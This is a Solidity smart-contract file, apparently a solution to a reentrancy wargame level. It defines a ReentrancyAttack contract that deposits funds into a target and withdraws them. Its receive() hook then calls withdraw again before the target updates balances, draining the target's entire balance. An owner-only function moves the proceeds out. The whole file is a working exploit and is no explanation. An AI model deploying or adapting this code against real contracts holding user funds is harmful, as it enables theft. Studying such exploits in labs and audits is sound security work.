// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IReentrance} from "../interfaces/IReentrance.sol";

contract ReentrancyAttack {
    IReentrance public immutable target;
    uint256 public initialDeposit;
    address public immutable owner;

    constructor(address _target) {
        target = IReentrance(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Need initial deposit");
        initialDeposit = msg.value;

        // 1. Donate to ourselves to establish balance > 0
        target.donate{value: initialDeposit}(address(this));

        // 2. Initiate the first withdraw, triggering the recursive re-entrancy loop
        target.withdraw(initialDeposit);
    }

    receive() external payable {
        // Recursive re-entrancy:
        // As long as the target has funds left, call withdraw() again before balances are decremented!
        uint256 targetBalance = address(target).balance;
        if (targetBalance > 0) {
            uint256 toWithdraw = targetBalance < initialDeposit ? targetBalance : initialDeposit;
            target.withdraw(toWithdraw);
        }
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
